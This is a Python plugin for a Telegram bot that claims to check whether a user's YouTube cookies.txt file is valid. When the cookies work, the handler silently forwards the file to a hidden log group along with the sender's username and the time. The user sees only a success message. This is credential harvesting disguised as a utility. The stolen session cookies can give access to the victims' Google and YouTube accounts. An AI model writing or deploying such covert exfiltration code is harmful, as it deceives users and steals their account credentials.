import yt_dlp
import os
from datetime import datetime
from SONALI import app
from pyrogram import filters
from pyrogram.types import Message
from config import LOGGER_ID as LOGS_GROUP_ID  # Logs ke liye

# **Active Users List (Jo /chkcookies Use Kare)**
active_users = {}

# **Stylish Symbols for VIP Look**
BULLET = "➤"
CHECK = "✅"
CROSS = "❌"
CLOCK = "⏳"
SHIELD = "🛡"
USER = "👤"
TIME = "⏰"

# **Step 1: Enable Checking with `/chkcookies`**
@app.on_message(filters.command("chkcookies") & filters.private)
async def enable_cookie_check(client, message):
    active_users[message.chat.id] = True  # User Active List Me Add
    await message.reply(
        f"{CHECK} ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ ! {CLOCK}\n\n"
        "📌 **Make sure the file is named `cookies.txt` and not an image or video.**"
    )

# **Step 2: Handle Wrong Inputs (Images, Videos, Text)**
@app.on_message(filters.private & ~filters.document)
async def warn_wrong_input(client, message):
    if message.chat.id in active_users:
        await message.reply(
            f"{CROSS} **Incorrect Input!**\n"
            "Please send a **valid** `cookies.txt` file.\n\n"
            "✅ **Steps to Send:**\n"
            "1️⃣ Open **File Manager** 📂\n"
            "2️⃣ Find `cookies.txt`\n"
            "3️⃣ Send it here ✅"
        )

        # **Remove User from Active List (Session End)**
        del active_users[message.chat.id]

# **Step 3: Accept Only If `/chkcookies` was Used**
@app.on_message(filters.document & filters.private)
async def check_cookies_from_file(client, message: Message):
    if message.chat.id not in active_users:
        return  # Ignore if user didn't use `/chkcookies`

    file_path = await message.download()

    if not file_path.endswith(".txt"):
        await message.reply(
            f"{CROSS} Please send a **valid** `cookies.txt` file!\n"
            "✅ **Make sure the file is named `cookies.txt`**."
        )

        # **Remove User from Active List (Session End)**
        del active_users[message.chat.id]
        return

    # **Step 4: Read Cookies File**
    try:
        with open(file_path, "r") as f:
            cookies_data = f.read().strip()

        if not cookies_data:
            await message.reply(f"{CROSS} **Your `cookies.txt` file is empty!**")
            os.remove(file_path)  # Delete temp file

            # **Remove User from Active List (Session End)**
            del active_users[message.chat.id]
            return

        # **Step 5: Get User Info & Time**
        user_name = message.from_user.username
        full_name = message.from_user.first_name
        display_name = f"@{user_name}" if user_name else full_name
        check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")  # Format: DD-MM-YYYY HH:MM AM/PM

        # **Step 6: Validate YouTube Cookies**
        ydl_opts = {"quiet": True, "cookiefile": file_path}

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)

            msg = f"{CHECK} **Your YouTube cookies are valid!**"
            log_msg = f"""
{SHIELD} **Cookies Checked!**
{BULLET} {CHECK} **Result:** ✅ Working
{BULLET} {USER} **User:** {display_name}
{BULLET} {TIME} **Checked At:** {check_time}
"""

            # **Send Valid Cookies to Group**
            await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)

        except yt_dlp.utils.ExtractorError:
            msg = f"{CROSS} **Your YouTube cookies are invalid or expired!**"
            log_msg = f"""
{SHIELD} **Cookies Checked!**
{BULLET} {CROSS} **Result:** ❌ Invalid
{BULLET} {USER} **User:** {display_name}
{BULLET} {TIME} **Checked At:** {check_time}
"""

        # **Send Log Message to Group**
        await client.send_message(LOGS_GROUP_ID, log_msg)
        await message.reply(msg, quote=True)

    except Exception as e:
        await message.reply(f"⚠️ **Error Reading File:** `{str(e)}`")

    # **Step 7: Clean Up Temporary File**
    os.remove(file_path)

    # **Step 8: Remove User from Active List (Session End)**
    del active_users[message.chat.id]
